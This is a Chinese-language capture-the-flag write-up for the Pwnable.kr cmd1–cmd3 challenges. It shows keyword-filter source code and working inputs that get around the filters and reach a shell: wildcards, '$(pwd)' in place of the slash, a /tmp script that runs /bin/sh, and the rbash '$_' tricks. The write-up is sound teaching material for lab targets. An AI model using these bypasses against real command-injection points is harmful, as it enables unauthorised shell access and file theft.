# 处理命令行过滤(Pwnable.kr cmd 系列)

## cmd1
**题目规定需要绝对路径**，简化的源代码如下
```cpp
bool filter(char* cmd) {
    // strstr()，0 表示没有找到子字符串
    retrun strstr(cmd, "flag") || strstr(cmd, "sh") || strstr(cmd, "tmp");
}
int main(int argc, char* argv[], char** envp){
        if( filter(argv[1]) ) return 0;
        system( argv[1] );
        return 0;
}
```
可以看到，如果单纯地使用`/bin/sh`会失败，使用`/bin/cat flag`也会失败，所以怎么办呢？

解决方法: `/bin/cat fla*` 或者 `/bin/cat 'f'lag`

## cmd2
**题目规定需要绝对路径**，简化的源代码如下
```cpp
int filter(char* cmd){
    return strstr(cmd, "=")!=0 || strstr(cmd, "PATH")!=0 || strstr(cmd, "export")!=0
            || strstr(cmd, "/") || strstr(cmd, "`")!=0 || strstr(cmd, "flag")!=0;
}

int main(int argc, char* argv[], char** envp){
    if( filter(argv[1]) ) return 0;
    system( argv[1] );
    return 0;
}
```
首先一个问题：需要使用绝对路径，那么`cd` 和 `pwd`需要绝对路径吗？

答案：不需要，因为`pwd`是`shell built-in command`. 使用`which pwd`，输出就是`shell built-in command`。

现在坏了，直接不能输入`/`了，这可怎么办？解决办法如下

1. 使用`pwd`命令，执行`./cmd2 'cd .. && pwd'`，结果为`/home`；执行`./cmd2 'cd .. && cd .. && pwd'`，结果为`/`，此时我们就可以用`$(pwd)`来代替`/`了。

    所以最后我们的输入为`./cmd2 'cd .. && cd .. && $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'`

2. 因为限制了`bin`，`flag`这些字段，所以我们新建文件`/tmp/cmd2/allen`，里面存`/bin/sh`，这样我们只要把那个文件改成可执行，然后执行这个文件即可，**通过文件来绕过命令行过滤**。

    所以最后我们的输入为`/home/cmd2/cmd2 '$(pwd)tmp$(pwd)allen'`，其中当前目录为`/`

## cmd3
源代码是很长的 python 文件，这里就简单说一下。

首先是文件存储情况，有两个文件夹，`flagbox`和`jail`，`jail`中提供三个执行文件: `ls`, `cat`, `id`，`flagbox`中在程序运行是会存储一个随机命名文件，如`KG3TSCVOPHSPINJD1N3MOD3T637CLX5L`，程序运行时会告诉我们，然后我们要输出这个文件里的内容，然后会得到flag。

要求只可以使用以下字符：`()[]{}<>#$%,?;_`。不要求绝对路径，但是在`rbash`这个 shell 下执行的，关于这个 shell，可以参考[1]，比较重要的一点，是不允许执行带有`/`的命令，但是除了命令是可以的。也即是说`/bin/ls`不可以，但是`cat test/test.txt`是可以的！

乍一看这道题，这怎么做嘛，就这几个破字符，连字母数字都不能输入，这怎么搞？所以，要慢慢来。下面都是利用 shell 的特性。

1. 第一要解决`cat`。<br>

**知识点一：shell 中 `?` 匹配**。比如当前文件夹有`test.sh`，如果我使用`???????`，那么 shell 就会匹配到`test.sh`，自动将我们输入转为匹配到的。本题目`cat`存放在`jail`目录中，所以我们使用`????/???`就可以匹配到了(有问题往下看)。

**知识点二：shell 中 `$_` 变量**。上一步很好, 但 `rbash` 不允许使用`/`，所以命令会失败。但是 SHELL 有变量 `$_` 表示上一次的 `argv[-1]`, 所以我们仍然得到了变量`$_ = jail/cat`。

**知识点三：shell 如何进行截断赋值**。现在就是怎么处理这个变量, 使用`____=${_#?????}`，这样`$____`变量就会丢弃`$_`变量的前面5个字符(因为`?`有5个)，所以经过这样的赋值我们得到了变量`$____ = cat`。

2. 第二要解决空格。<br>

**知识点四：shell 中有好几种方式可以代替空格**。参考[2]，现在我们可以用`<>`或者`>`来代替空格。但是，对于`rbash`，应该只能使用`<`而不能使用`<>`！

### 答案一 
刚开始告诉我们存储密码的文件: `flag/xxx(32bits)`, 此时我们新建 `/tmp/__/1` 文件, 其中内容即为 `flag/xxx(32bits)`.
- `????/???`<br>
匹配到 `jail/cat`, 即 `_` 为 `jail/cat`.
- `__=${_#?????}`<br>
让 `__` 等于 `cat`, 由于 `PATH=jail`, 所以执行 `cat` 是可以的.
- `$($__</???/__/?)`<br>
括号里面相当于 `cat /tmp/__/1`, 里面是 `flag/xxxx`, 最终相当于我们执行了 `flag/xxxx` 命令.
- `$__<$_`<br>
由于上一条执行了 `flag/xxx` 命令, 所以 `$_` 等于 `flag/xxx`, 所以最终相当于 `cat flag/xxxx`.

### 答案二
唯一的不同点是第三条, 干脆直接输入 `? * 7 / ? * 32`, 我在这里用 `* 7` 缩写, 实际情况要全部写上, 最后同样会匹配到文件 `flagbox/xxx(32bits)`.

### 重要说明
上面的两个答案, 一定要一起执行, 即最终输入为 `cmd1; cmd2; cmd3; cmd4`, 分开写是错的.

> **为什么是错的?**
> 
> 以第一句和第二句为例. 第一句 `????/???` 想匹配 `jail/cat`, 此时命令行最后会输出错误信息: `/bin/rbash: line 1: jail/cat: ...`.
>
> 如果单独写这一句后回车, 此时的 `$_` 为 `/bin/rbash`!!! 但如果不是单独一句, 比如 `cmd1; cmd2`, 在执行 `cmd2` 的时候, `$_` 为 `jail/cat`!!!
>
> 仔细体会这之间的差异, 原因就是由于回车后, `rbash` 发现错误后相当于执行了 `rbash` 命令, 导致 `$_` 成了 `/bin/rbash`.

## 总结
- 有一些命令是自带命令，这些并不是执行 `/bin` 目录中的可执行文件, 比如`pwd`，不确定的话可以使用`which`命令查看一下

- 以例子来谈，使用`fla*`来解决 `flag` 的限制，使用`$(pwd)`来解决 `/` 的限制

- SHELL 特殊用法: `?`, `$_`, `<`, `<>`

- `cmd3` 可以好好看看, 以及一定要注意 `$_` 可能会被最后的报警产生意外的错误

## 参考
[1] https://xz.aliyun.com/t/7642

[2] https://www.cnblogs.com/sevck/p/6072721.html

<!-- flagbox/EIFBJAJKNULDNVO8T2RCCWCME0SB1V1O -->
